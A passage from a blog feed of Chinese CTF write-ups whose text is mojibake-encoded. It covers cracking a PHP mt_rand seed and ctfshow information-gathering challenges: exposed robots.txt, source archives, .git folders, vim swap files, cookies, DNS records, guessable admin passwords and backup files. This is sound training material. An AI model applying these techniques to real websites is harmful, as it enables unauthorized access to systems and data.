src="https://img-blog.csdnimg.cn/20200712192116451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞"><br> ÂæóÂà∞Ôºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">20</span> <span class="token number">20</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">19</span> <span class="token number">19</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">51</span> <span class="token number">51</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">24</span> <span class="token number">24</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">46</span> <span class="token number">46</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Â∞ÜËøô‰∏Ä‰∏≤ÊãøÂà∞Â∑•ÂÖ∑ÈáåÂéª‰ΩøÁî®<br> ÁàÜÁ†¥Âá∫‰º™ÈöèÊú∫Êï∞ÂíåphpÁâàÊú¨</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">.</span><span class="token operator">/</span>php_mt_seed <span class="token number">20</span> <span class="token number">20</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">19</span> <span class="token number">19</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">51</span> <span class="token number">51</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">24</span> <span class="token number">24</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">46</span> <span class="token number">46</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200712192456776.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞"><br> ÁàÜÁ†¥ÁöÑÂà∞ÁßçÂ≠ê‰∏∫Ôºö206396968ÔºåÂ¶Ç‰∏ãÊîπÂÜôÊ∫êÁ†ÅÔºå‰æøÂèØ‰ª•ÂæóÂà∞ÂÆåÊï¥ÁöÑÂ≠óÁ¨¶‰∏≤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">206396968</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200712192710912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞"><br> ÊãøÁùÄÂæóÂà∞ÂæóÂ≠óÁ¨¶ËΩ¨Êèê‰∫§Âç≥ÂèØÂæóÂà∞flagÔºö<br> <img src="https://img-blog.csdnimg.cn/20200712192816550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞"></p><p>**‰ª•‰∏äÂÜÖÂÆπÊëòËá™<a href="https://blog.csdn.net/qq_45521281">WHOAMIAnony</a> **</p>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf show</title>
      <link href="/2022/12/11/ctf-show/"/>
      <url>/2022/12/11/ctf-show/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="webÂÖ•Èó®"><a href="#webÂÖ•Èó®" class="headerlink" title="webÂÖ•Èó®"></a>webÂÖ•Èó®</h1><h2 id="‰ø°ÊÅØÊêúÈõÜÁØá"><a href="#‰ø°ÊÅØÊêúÈõÜÁØá" class="headerlink" title="‰ø°ÊÅØÊêúÈõÜÁØá"></a>‰ø°ÊÅØÊêúÈõÜÁØá</h2><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>È¶ñÂÖàÁúãÂà∞Ëøô‰∏™ÊèêÁ§∫Ôºö</p><p><img src="https://img-blog.csdnimg.cn/596f9173f7ed4395b605372b2485798e.png#pic_center" alt="1"></p><p>ÊâìÂºÄÈìæÊé•ÂêéÂè™ÊúâËøôÔºö</p><p><img src="https://img-blog.csdnimg.cn/1f73d1abe28040d8b6694aac5d241642.png#pic_center" alt="2"></p><p>‰∏ãÊÑèËØÜCTRL+UÊü•ÁúãÊ∫êÁ†ÅÔºåÊ≤°Êúâ‰ø°ÊÅØ„ÄÇ</p><p>Êú¨È¢ò‰∏ªË¶ÅËÄÉÂØüÈ°πÁõÆÈùôÊÄÅÊñá‰ª∂robots.txtÁöÑÂÜÖÂÆπÔºå‰∏Ä‰∫õÈ°πÁõÆrobots.txt‰ºöÂ≠òÊîæ‰∫éÈ°µÈù¢<a href="https://so.csdn.net/so/search?q=%E6%A0%B9%E7%9B%AE%E5%BD%95&spm=1001.2101.3001.7020">Ê†πÁõÆÂΩï</a>„ÄÇÈáåÈù¢ÂåÖÂê´‰∏Ä‰∫õÈáçË¶Å‰ø°ÊÅØ„ÄÇÂõ†Ê≠§Êàë‰ª¨Â∞ùËØïÂú®ÁΩëÂùÄÂêéÈù¢Ê∑ªÂä†&#x2F;robots.txt„ÄÇÁªìÊûúÊúâ‰∫ÜÊñ∞ÁöÑÂèëÁé∞Ôºö</p><p><img src="https://img-blog.csdnimg.cn/f67302ed82a940179b4af7082c8b1c2a.png#pic_center" alt="3"></p><p>Êàë‰ª¨Âú®ÁΩëÂùÄÂêéÈù¢Âä†‰∏ä&#x2F;flagishere.txtÔºåflagÊòæÁé∞„ÄÇ</p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>ÊúâÊèêÁ§∫Ôºö</p><p><img src="https://img-blog.csdnimg.cn/a501687594b2446a8c353d48ff9ac942.png#pic_center" alt="4"></p><p>phpsÊñá‰ª∂Â∞±ÊòØphpÁöÑÊ∫ê‰ª£Á†ÅÊñá‰ª∂ÔºåÈÄöÂ∏∏Áî®‰∫éÊèê‰æõÁªôÁî®Êà∑ÔºàËÆøÈóÆËÄÖÔºâÁõ¥Êé•ÈÄöËøáWebÊµèËßàÂô®Êü•Áúãphp‰ª£Á†ÅÁöÑÂÜÖÂÆπ„ÄÇ</p><p>ÊâìÂºÄÈìæÊé•ÔºåÊàëÊòØÂÖàÊäìÂåÖÔºårepeaterÂêéÁúãÂà∞ÊòØÁî®phpËØ≠Ë®ÄÁºñÂÜôÁöÑ„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/b51eee7ec5e64148b8010a113ee635ae.png#pic_center" alt="6"></p><p>ÂÖ∂‰∏ªÈ°µÊñá‰ª∂Â∫îËØ•ÊòØ<strong>Ôºöindex.php</strong>ÔºåËÆøÈóÆÁúãÁúãÔºåÊ≤°ÊòæÁ§∫„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/82eb6e04e80f47699c17d354a8ab970d.png#pic_center" alt="5"></p><p>ËÆøÈóÆÔºö**&#x2F;index.phps**‰∏ãËΩΩÊñá‰ª∂Êü•ÁúãÔºåÂæóÂà∞flag„ÄÇ</p><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>ÂÆòÊñπÊèêÁ§∫ÔºöËß£ÂéãÊ∫êÁ†ÅÂà∞ÂΩìÂâçÁõÆÂΩïÔºåÊµãËØïÊ≠£Â∏∏ÔºåÊî∂Â∑•</p><p>ËØ¥ÊòéÊ∫êÁ†ÅËß£ÂéãÂà∞ÂΩìÂâçÁõÆÂΩïÂêéÔºå‰∫ßÂìÅÂ∞±‰∏äÁ∫ø‰∫ÜÔºåÊ∫êÁ†ÅÁöÑÂéãÁº©ÂåÖÊ≤°ÊúâÂà†Èô§ÔºåÂØºËá¥ÂèØ‰ª•Ë¢´‰∏ãËΩΩ</p><p>‰∏ÄËà¨ÂºÄÂèëÁöÑÊ∫êÁ†ÅÂéãÁº©ÂåÖÂêçÂ≠óÈÉΩÊòØw w w.zip</p><p><img src="https://img-blog.csdnimg.cn/27bf54b0ccb4478d94089ce1a2c99afd.png#pic_center" alt="7"></p><p>ÊâÄ‰ª•ËÆøÈóÆ‰∏ãËΩΩÂà∞Ëøô‰∏™ÂéãÁº©ÂåÖÔºåËß£ÂéãÂæóÂà∞flag„ÄÇ</p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>ÂÆòÊñπÊèêÁ§∫ÔºöÁâàÊú¨ÊéßÂà∂ÂæàÈáçË¶ÅÔºå‰ΩÜ‰∏çË¶ÅÈÉ®ÁΩ≤Âà∞Áîü‰∫ßÁéØÂ¢ÉÊõ¥ÈáçË¶Å„ÄÇ</p><p>ÁâàÊú¨ÊéßÂà∂Â∏∏Áî®‰∏§ÁßçËΩØ‰ª∂Ôºå‰∏ÄÁßçÊòØgitÔºå‰∏ÄÁßçÊòØsvnÔºåÁâàÊú¨ÊéßÂà∂Ê≥ÑÈú≤Â∞±ÊòØÂ∞Ü.gitÊñá‰ª∂Â§πÊàñËÄÖ.svnÊñá‰ª∂Â§π‰πüÈÉ®ÁΩ≤Âà∞ÁΩëÁ´ô‰∏ä‰∫ÜÔºåÂ¶ÇÊûúÂà´‰∫∫ËÆøÈóÆurl&#x2F;.gitÂ∞±ÂèØ‰ª•ËÆøÈóÆÂà∞„ÄÇ</p><p>ËØïÁùÄËÆøÈóÆ&#x2F;.gitÂíå&#x2F;.svnÔºåÂèëÁé∞ËÆøÈóÆ&#x2F;.gitÂá∫Áé∞flag„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/c71171b9596a457a9de2f33409e5020f.png#pic_center" alt="8"></p><p><img src="https://img-blog.csdnimg.cn/f99e0efe08b94cffa35fb0b89c67f324.png#pic_center" alt="9"></p><h4 id="git-svn-Ê≥ÑÈú≤"><a href="#git-svn-Ê≥ÑÈú≤" class="headerlink" title="git svn Ê≥ÑÈú≤"></a>git svn Ê≥ÑÈú≤</h4><p>‚Äã     <strong>git‰∏ésvnÁöÑÂå∫Âà´Ôºö</strong><br>1.gitÊòØÂàÜÂ∏ÉÂºèÁöÑÔºåsvnÊòØÈõÜ‰∏≠ÂºèÁöÑ<br>2.gitÂ∞ÜÊØè‰∏™ÂéÜÂè≤ÁâàÊú¨ÈÉΩÂ≠òÂÇ®ÂÆåÊï¥ÁöÑÊñá‰ª∂ÔºåsvnÂè™ÊòØÂ≠òÂÇ®Â∑ÆÂºÇÁöÑÊñá‰ª∂ÔºåÂéÜÂè≤ÁâàÊú¨‰∏çÂèØÊÅ¢Â§ç<br>3.gitÂèØ‰ª•Á¶ªÁ∫øÂÆåÊàêÂ§ßÈÉ®ÂàÜÁöÑÊìç‰ΩúÔºåsvn‰∏çÂèØ‰ª•Á¶ªÁ∫øÊìç‰Ωú<br>4.gitÂèØ‰ª•ÂÆûÁé∞ÂàÜÊîØÂêàÂπ∂<br>5.gitÂèØ‰ª•‰øÆÊîπÂíåÊí§ÈîÄ‰øÆÊîπÂéÜÂè≤ÁâàÊú¨<br>6.gitÈÄüÂ∫¶Âø´ÔºåÊïàÁéáÈ´ò<br>7.gitÊúâÊú¨Âú∞‰ªìÂ∫ì<br>8.git‰ª•ÂÖÉÊï∞ÊçÆÊñπÂºèÂ≠òÂÇ®Ôºåsvn‰ª•ÂéüÂßãÊñá‰ª∂Â≠òÂÇ®</p><p>ËØ¶ÁªÜÂÜÖÂÆπËØ∑ÁôæÂ∫¶Ôºö<a href="https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&tn=monline_3_dg&wd=git%E5%92%8Csvn&oq=git&rsv_pq=b430d72200b4dd6f&rsv_t=999c8e4eC5soN/fN57lz7fw37UWO8FFEV83oxK4Llmxk1PdSlz9Mtjcx5JkGUeJCSXoZ&rqlang=cn&rsv_dl=tb&rsv_enter=1&rsv_sug3=8&rsv_sug1=7&rsv_sug7=100&rsv_sug2=0&rsv_btype=t&inputT=5881&rsv_sug4=9087">gitÂíåsvn</a></p><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>ÂÆòÊñπÊèêÁ§∫ÔºöÂèëÁé∞ÁΩëÈ°µÊúâ‰∏™ÈîôÂà´Â≠óÔºüËµ∂Á¥ßÂú®Áîü‰∫ßÁéØÂ¢ÉvimÊîπ‰∏ãÔºå‰∏çÂ•ΩÔºåÊ≠ªÊú∫‰∫Ü„ÄÇ</p><p>vimÂú®ÁºñËæëÊñá‰ª∂ÁöÑÊó∂ÂÄôÔºå‰ºöÊúâ‰∏Ä‰∏™Â§á‰ªΩÔºåÂêéÁºÄÂêç.swpÔºåÂ¶ÇÊûúÁ™ÅÁÑ∂Êñ≠ÁîµÔºåËøô‰∏™Â§á‰ªΩÊñá‰ª∂Â∞±‰ºöÁïôÂ≠ò‰∏ãÊù•ÔºåÂèØ‰ª•Ë¢´‰∫∫ËÆøÈóÆÂà∞„ÄÇ</p><p>Áî±È¢òÁõÆ‰∏≠ÁöÑÊèêÁ§∫ÂèØ‰ª•Áü•ÈÅìÔºåvim‰øÆÊîπÁöÑÊñá‰ª∂Âπ∂Ê≤°Êúâ‰øùÂ≠òÂêéÂÖ≥Èó≠ËÄåÊòØÁõ¥Êé•ÂÖ≥Èó≠ÔºåÊâÄ‰ª•Á¨¨‰∏ÄÊ¨°‰ºö‰∫ßÁîü‰∏Ä‰∏™.&lt;Êñá‰ª∂Âêç&gt;.php.swpÊñá‰ª∂ÔºåÁ¨¨‰∫åÊ¨°‰ºöÊúâ‰∏Ä‰∏™.&lt;Êñá‰ª∂Âêç&gt;.php.swoÊñá‰ª∂ÔºåÁ¨¨‰∏âÊ¨°‰ºöÊúâ‰∏Ä‰∏™.&lt;Êñá‰ª∂Âêç&gt;.php.swnÊñá‰ª∂„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/47bf101e57d04da187598dcc27d1fd49.png#pic_center" alt="10"></p><p>ËÆøÈóÆurl&#x2F;index.php.swpÂèØ‰ª•‰∏ãËΩΩËøô‰∏™Êñá‰ª∂ÔºåflagÂ∞±Âú®ËøôÈáå„ÄÇ</p><p>‚Äã       ËØïÁùÄËÆøÈóÆ‰∏Ä‰∏ãÂêé‰∏§‰∏™Êñá‰ª∂„ÄÇ</p><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>ÊèêÁ§∫Ôºöcookie Âè™ÊòØ‰∏ÄÂùóÈ•ºÂπ≤Ôºå‰∏çËÉΩÂ≠òÊîæ‰ªª‰ΩïÈöêÁßÅÊï∞ÊçÆ</p><p>ËøòÊòØËøôÔºö</p><p><img src="https://img-blog.csdnimg.cn/ef469b9758f141a19ca3fddc186a24d3.png" alt="11"></p><p>Êó¢ÁÑ∂ÊúâÊèêÁ§∫ÔºåÊàë‰ª¨ÊäìÂåÖÁúã‰∏Ä‰∏ãcookieÔºö<img src="https://img-blog.csdnimg.cn/439d83193a654d5bbb1e63afc6ac2b4b.png" alt="12"><br>flagÂà∞Êâã„ÄÇ</p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>ÊèêÁ§∫ÔºöÂüüÂêçÂÖ∂ÂÆû‰πüÂèØ‰ª•ÈöêËóè‰ø°ÊÅØÔºåÊØîÂ¶Çflag.ctfshow.com Â∞±ÈöêËóè‰∫Ü‰∏ÄÊù°‰ø°„ÄÇ<br>Êó¢ÁÑ∂ËØ¥‰∫ÜÂüüÂêçÈöêËóè‰ø°ÊÅØÈÇ£Êàë‰ª¨Áî®<a href="http://dbcha.com/">dnsÊ£ÄÊü•Êü•ËØ¢</a><br><img src="https://img-blog.csdnimg.cn/f1d3798a100d410ab33338bcf3fad2cd.png" alt="13">Âú®txtÊ†èÂæóÂà∞flag„ÄÇÔºàTXT ËÆ∞ÂΩïÔºå‰∏ÄËà¨Êåá‰∏∫Êüê‰∏™‰∏ªÊú∫ÂêçÊàñÂüüÂêçËÆæÁΩÆÁöÑËØ¥Êòé„ÄÇÔºâ</p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>ÊúâÊèêÁ§∫ÔºöÊúâÊó∂ÂÄôÁΩëÁ´ô‰∏äÁöÑÂÖ¨ÂºÄ‰ø°ÊÅØÔºåÂ∞±ÊòØÁÆ°ÁêÜÂëòÂ∏∏Áî®ÂØÜÁ†Å<br>ÈÇ£ÊâæÊâæÂØÜÁ†ÅÔºåÂ∏ÆÂä©ÁÉ≠Á∫øÂè∑Á†ÅÂ•ΩÂÉèÂØÜÁ†Å„ÄÇ<img src="https://img-blog.csdnimg.cn/7f1240fdcf74469cb9d089eba6742563.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞">‰ª•ÁÆ°ÁêÜÂëòË∫´‰ªΩÁôªÂÖ•ÂêéÂè∞ÁúãÁúãÔºö<br><img src="https://img-blog.csdnimg.cn/22ac034131d54e918c466f472da1f461.png" alt="14"><br>ÊûúÁÑ∂ÔºåËæìÂÖ•ÂØÜÁ†ÅÂêéflagÊòæÁé∞ctfshow{c9494549-232c-4a44-af85-06574f2ed4b7}</p><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>ÁúãÊèêÁ§∫ÔºöÊäÄÊúØÊñáÊ°£ÈáåÈù¢‰∏çË¶ÅÂá∫Áé∞ÊïèÊÑü‰ø°ÊÅØÔºåÈÉ®ÁΩ≤Âà∞Áîü‰∫ßÁéØÂ¢ÉÂêéÂèäÊó∂‰øÆÊîπÈªòËÆ§ÂØÜÁ†Å<br>Áúã‰∫Ü‰∏ÄÈÅçÁΩëÈ°µÔºåÂèëÁé∞Â∫ïÈÉ®Êúâ‰∏™documentÔºåÁÇπÂºÄÁúãÁúãÔºö<br><img src="https://img-blog.csdnimg.cn/677b3711b60c469dbaf0f866ae4119cc.png" alt="15"><br>ÂìàÂìàËØïËØïÂëó<br><img src="https://img-blog.csdnimg.cn/0ad9cac0edb94e54baccc03df56b8e8c.png" alt="16"></p><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>ÊèêÁ§∫ÔºöÊúâÊó∂ÂÄôÊ∫êÁ†ÅÈáåÈù¢Â∞±ËÉΩ‰∏çÁªèÊÑèÈó¥Ê≥ÑÈú≤ÈáçË¶Å(editor)ÁöÑ‰ø°ÊÅØ,ÈªòËÆ§ÈÖçÁΩÆÂÆ≥Ê≠ª‰∫∫<br>Âæ°ÂâëÊâ´Êèè‰∏Ä‰∏ãÔºö<br><img src="https://img-blog.csdnimg.cn/6c8b1c4eb3ac4d29a51186d2839221eb.png" alt="17">‰∏çÈîôÔºåËøõÂÖ•&#x2F;editorÁúãÁúãÔºö<br><img src="https://img-blog.csdnimg.cn/0ef15f64db654755aec7a7a7c00fa38b.png" alt="18">ÁÑ∂ÂêéÁÇπ‰∏ä‰º†Êñá‰ª∂ÔºåÂú®Êñá‰ª∂Á©∫Èó¥‰∏≠Êåâ<strong>tmp&#x2F;html&#x2F;nothinghere</strong>Ëøô‰∏™Ë∑ØÂæÑÊâæÂà∞fl000g.txtÔºåÁ°ÆÂÆöÔºåÂæóÂà∞‰∏ÄÂ†ÜË∑ØÂæÑ, ÂâçÈù¢ÁöÑÊòØÁºñËØëÂô®ÁöÑÁªùÂØπË∑ØÂæÑÔºåÊàë‰ª¨ËÆøÈóÆÂêéÈù¢ÁöÑ**&#x2F;nothinghere&#x2F;fl000g.txt**Â∞±ÂèØ‰ª•ÂæóÂà∞flag‰∫Ü„ÄÇ</p><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p>ÊèêÁ§∫Ôºö<strong>ÂÖ¨ÂºÄÁöÑ‰ø°ÊÅØÊØîÂ¶ÇÈÇÆÁÆ±ÔºåÂèØËÉΩÈÄ†Êàê‰ø°ÊÅØÊ≥ÑÈú≤Ôºå‰∫ßÁîü‰∏•ÈáçÂêéÊûú</strong></p><p>ËøõÂÖ•È¢òÁõÆÂêéÁúãÂà∞Êúâ‰∏™QQÈÇÆÁÆ±ÔºåÊàë‰ª¨Êêú‰∏Ä‰∏ãÂÆÉÁöÑQQ„ÄÇÊ≤°Âï•‰ø°ÊÅØÔºåËøîÂõûÂà∞ÂàöÊâçÁöÑÁΩëÁ´ôÂä†ÂêéÁºÄÁúãËÉΩ‰∏çËÉΩËøõÂéªÂêéÂè∞Ôºö<br><img src="https://img-blog.csdnimg.cn/da05c6a03cad4131b2f010f9538c5320.png" alt="15"><br>‰∏çÁü•ÈÅìÁî®Êà∑ÂêçÂØÜÁ†ÅÂìéÔºåÈÇ£ÂøòËÆ∞ÂØÜÁ†ÅÂêßÔºÅÂèëÁé∞‰∏Ä‰∏™‰ø°ÊÅØÔºö<br><img src="https://img-blog.csdnimg.cn/f22b46a6672d4a4bb5acecc3ff05f611.png" alt="15"><br>ÂàöÊâçÊêúÁöÑQQÁî®Êà∑Âú®Ë•øÂÆâÔºåÊàë‰ª¨ ËØïËØïÔºå<img src="https://img-blog.csdnimg.cn/2b245d352a024f6aae4c1a9f4c76ccaa.png" alt="15"><br>ÊûúÁÑ∂‰∏çÂá∫ÊàëÊâÄÊñôÔºåÁÑ∂ÂêéËøîÂõûËæìÂÖ•ÂØÜÁ†ÅÔºåÂæóÂà∞flag„ÄÇ</p><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p>ÊèêÁ§∫Ôºö<strong>ÂØπ‰∫éÊµãËØïÁî®ÁöÑÊé¢ÈíàÔºå‰ΩøÁî®ÂÆåÊØïÂêéË¶ÅÂèäÊó∂Âà†Èô§ÔºåÂèØËÉΩ‰ºöÈÄ†Êàê‰ø°ÊÅØÊ≥ÑÈú≤</strong><br>Âï•ÊòØÊé¢ÈíàÂë¢ÔºüÊêúÁ¥¢‰∏Ä‰∏ãÔºåÊúÄÂêéÁúãÂà∞ÊúâÂÖ≥‰∫éPHPÊé¢ÈíàÁöÑËß£Èáä</p><blockquote><p>phpÊé¢ÈíàÊòØÁî®Êù•Êé¢ÊµãÁ©∫Èó¥„ÄÅÊúçÂä°Âô®ËøêË°åÁä∂ÂÜµÂíåPHP‰ø°ÊÅØÁî®ÁöÑÔºåÊé¢ÈíàÂèØ‰ª•ÂÆûÊó∂Êü•ÁúãÊúçÂä°Âô®Á°¨ÁõòËµÑÊ∫ê„ÄÅÂÜÖÂ≠òÂç†Áî®„ÄÅÁΩëÂç°ÊµÅÈáè„ÄÅÁ≥ªÁªüË¥üËΩΩ„ÄÅÊúçÂä°Âô®Êó∂Èó¥Á≠â‰ø°ÊÅØ„ÄÇ</p></blockquote><p>ÂÖ∑‰ΩìËß£ÈáäËØ∑ÁÇπÂáª<a href="https://baike.baidu.com/item/PHP%E6%8E%A2%E9%92%88/10922752">phpÊé¢Èíà</a>„ÄÇ<br><img src="https://img-blog.csdnimg.cn/20be60559dd64161aeb30a72d6de10ca.png" alt="16">Êàë‰ª¨ËØïËØï**&#x2F;tz.php**<img src="https://img-blog.csdnimg.cn/25ab292735884c0f9edaf18fc619f12e.png" alt="16"><img src="https://img-blog.csdnimg.cn/38ddc1cf0aa64edca4df5cdde973a6af.png" alt="16"></p><p>Êúâ‰∏™PHP‰ø°ÊÅØÔºåÊâìÂºÄÁúãÁúã:<img src="https://img-blog.csdnimg.cn/cd667b76d4134efdb200a483efa46f30.png" alt="16"><br>ÊâìÂºÄ‰πãÂêéÁõ¥Êé•ÊâæÂÖ≥ÈîÆÂ≠óÁ¨¶‚Äúctfshow‚ÄùÔºåÂæóÂà∞flag„ÄÇ</p><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><p>ÊèêÁ§∫Ôºö<strong>Â§á‰ªΩÁöÑsqlÊñá‰ª∂‰ºöÊ≥ÑÈú≤ÊïèÊÑü‰ø°ÊÅØ</strong><br>Ê≤°ÊÄùË∑ØÂïä<img src="https://img-blog.csdnimg.cn/ba8913b0cb3f4a9b82985fa9246120ab.png" alt="17">ÊàëÂú®ÁΩë‰∏äÊêú‰∫Ü‰∏Ä‰∏ã<strong>Êü•ÁúãËá™Â∑±Â§á‰ªΩÁöÑSQLÊñá‰ª∂</strong>‰πü‰∏çÁü•ÈÅìÊÄé‰πàÂäû„ÄÇ‰ΩÜÂ§á‰ªΩÁöÑËã±ËØ≠Â•ΩÂÉèÊòØbackupÔºåÁúã‰∏Ä‰∏ã**&#x2F;backup.sqlÊñá‰ª∂**ÔºåÊâæÂà∞flag„ÄÇ</p><h4 id="Áü•ËØÜÁÇπ"><a href="#Áü•ËØÜÁÇπ" class="headerlink" title="Áü•ËØÜÁÇπ"></a>Áü•ËØÜÁÇπ</h4><p>sqlÊñá‰ª∂ÁöÑÂ§á‰ªΩ‰∏ÄËà¨‰∏∫<strong>backup.sql</strong></p><h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>ÊèêÁ§∫Ôºö<strong>‰∏çË¶ÅÁùÄÊÄ•Ôºå‰ºëÊÅØÔºå‰ºëÊÅØ‰∏Ä‰ºöÂÑøÔºåÁé©101ÂàÜÁªô‰Ω†flag</strong><br>ÊàëÁ¨¨‰∏ÄÂèçÂ∫îÂ∞±ÊòØÊäìÂåÖÊîπÊï∞ÊçÆÔºåÈÇ£Â∞±ËØïËØïÂêßÔºÅ<br>Êäì‰∫ÜÂ•ΩÂá†Ê¨°ÔºåÊ≤°Áî®„ÄÇÂÉèÂæÄÂ∏∏‰∏ÄÊ†∑ÔºåÁúãÁúãÊ∫ê‰ª£Á†Å<img src="https://img-blog.csdnimg.cn/17d6f2c0470645ee9e9d2bd951f760b3.png" alt="18">ÁÇπÂºÄÁúãÁúãÔºö<br><img src="https://img-blog.csdnimg.cn/c113565d12794d029a997ed511c7685f.png" alt="18"><br>Áõ¥Êé•Êâæ‚Äúctfshow‚ÄùÊâæ‰∏çÂà∞ÔºåÈÇ£ÁúãÁúãÊúâ‰ªÄ‰πàÈó¥Êé•ÁöÑ‰ø°ÊÅØ„ÄÇ<img src="https://img-blog.csdnimg.cn/6e200f592d7c46c794731761f8662f69.png" alt="18">Â•ΩÂÉèÊúâÁ∫øÁ¥¢ÔºåÊòØÊüêÁßçÁ±ªÂûãÁöÑÁºñÁ†ÅÔºåÂ∞ùËØïËß£‰∏Ä‰∏ã„ÄÇ<br><img src="https://img-blog.csdnimg.cn/51a0c388d55b4cb6896c98cfbecab8bb.png" alt="18"><br>Âéª110.phpÁúãÁúã,Âá∫Áé∞flag„ÄÇ</p><h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><p>ÊèêÁ§∫Ôºö<strong>ÂØÜÈí•‰ªÄ‰πàÁöÑÔºåÂ∞±‰∏çË¶ÅÊîæÂú®ÂâçÁ´Ø‰∫Ü</strong><br><img src="https://img-blog.csdnimg.cn/e438c4cc7a9f4e98ba0cbd0220c26d37.png" 